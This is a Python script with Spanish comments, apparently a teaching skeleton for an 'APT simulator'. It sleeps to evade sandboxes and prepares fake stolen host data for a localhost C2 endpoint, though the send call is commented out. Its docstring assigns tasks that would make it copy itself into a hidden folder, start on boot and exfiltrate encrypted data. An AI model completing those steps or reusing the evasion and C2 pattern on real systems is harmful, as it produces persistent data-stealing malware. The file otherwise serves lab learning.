import time
import random
import requests

def main():
    """
    [ES] Punto de entrada del Simulador APT.
    
    Explicación humana:
    Un APT (Amenaza Persistente Avanzada) es como un espía muy paciente. 
    Una vez que entra al sistema, no hace ruido ni rompe cosas de inmediato. 
    Se oculta, espera, y de vez en cuando envía pequeños paquetes de información 
    a su 'jefe' (el servidor C2 - Comando y Control).
    
    Tu misión para completar este proyecto:
    1. Haz que este script se copie a sí mismo en una carpeta oculta.
    2. Haz que se inicie automáticamente cuando el equipo se encienda (Persistencia).
    3. Simula que roba información (como el nombre del equipo) y la envía cifrada.
    """
    
    print("[+] Iniciando Simulador APT (Modo Ético/Laboratorio)...")
    
    # 1. Simulación de "dormir" para evitar ser detectado por análisis dinámicos (sandboxes)
    # Los antivirus a veces ejecutan el archivo durante 5 segundos para ver qué hace.
    # Si dormimos 10 segundos, el antivirus pensará que el archivo es inofensivo.
    sleep_time = random.randint(5, 15)
    print(f"[*] Durmiendo por {sleep_time} segundos para evadir sandboxes...")
    time.sleep(sleep_time)
    
    # 2. Recolección de datos (simulada)
    print("[*] Recolectando información del sistema...")
    datos_robados = {"equipo": "MaquinaPrueba-01", "sistema": "Windows"}
    
    # 3. Comunicación con el C2 (Simulada)
    # Aquí deberías implementar cifrado AES o RSA para que si alguien
    # intercepta el tráfico de red, no pueda leer los datos.
    c2_url = "http://127.0.0.1:8080/exfiltrar"
    print(f"[*] Intentando enviar datos a {c2_url}...")
    
    try:
        # requests.post(c2_url, json=datos_robados, timeout=3)
        print("[+] ¡Datos enviados con éxito! (Simulado)")
    except Exception as e:
        print(f"[-] No se pudo conectar al C2: {e}")

if __name__ == "__main__":
    main()
